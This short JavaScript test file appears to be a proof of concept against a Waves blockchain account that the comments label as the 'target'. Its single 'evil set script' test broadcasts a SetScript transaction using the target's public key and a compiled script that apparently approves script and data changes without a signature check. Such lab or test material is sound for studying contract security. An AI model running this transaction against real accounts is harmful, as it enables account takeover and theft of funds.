/**
 * A - target, B - attacker
 */
const accAAddr = "3NAEZLDh5hPZCMesPkL9vCd8R5MgvRfsebt";
const accAPK = "9mYdn1R1guTxbhpcsy8hdzaXgKLvsrb7h7da4h99Ygbr";

console.log("target address with waves: " + accAAddr);

it("evil set script", async function () {
    let tx = await broadcast(setScript({
        senderPublicKey: accAPK,
        script: "base64:AAIDAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAACdHgBAAAABnZlcmlmeQAAAAAEAAAAByRtYXRjaDAFAAAAAnR4AwkAAAEAAAACBQAAAAckbWF0Y2gwAgAAABRTZXRTY3JpcHRUcmFuc2FjdGlvbgQAAAABZAUAAAAHJG1hdGNoMAYDCQAAAQAAAAIFAAAAByRtYXRjaDACAAAAD0RhdGFUcmFuc2FjdGlvbgQAAAABZAUAAAAHJG1hdGNoMAYGPQe3pg==",
        fee: 1400000
    }));
    await waitForTx(tx.id);
    console.log(JSON.stringify(tx))
});
